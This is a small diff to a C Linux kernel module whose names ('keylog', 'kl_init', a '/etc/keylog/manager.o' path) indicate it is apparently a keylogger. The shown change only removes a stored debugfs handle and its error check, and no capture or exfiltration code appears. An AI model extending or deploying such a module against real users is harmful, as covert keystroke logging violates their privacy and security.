@@ -37,7 +37,6 @@ u32 major;
 char* major_string[10];
 
 static char* target_process = "/etc/keylog/manager.o";
-static struct dentry *file;
 static struct dentry *subdir;
 
 #ifndef BUFLEN
@@ -609,11 +608,7 @@ static int __init kl_init(void)
 	if (!subdir)
 		return -ENOENT;
 
-	file = debugfs_create_u32("major", 0400, subdir, &major);
-	if (!file) {
-		debugfs_remove_recursive(subdir);
-		return -ENOENT;
-	}
+	debugfs_create_u32("major", 0400, subdir, &major);
 	ret = register_chrdev(0, DEVICE_NAME, &fops);
 	if (ret < 0) {
 		printk(KERN_ERR
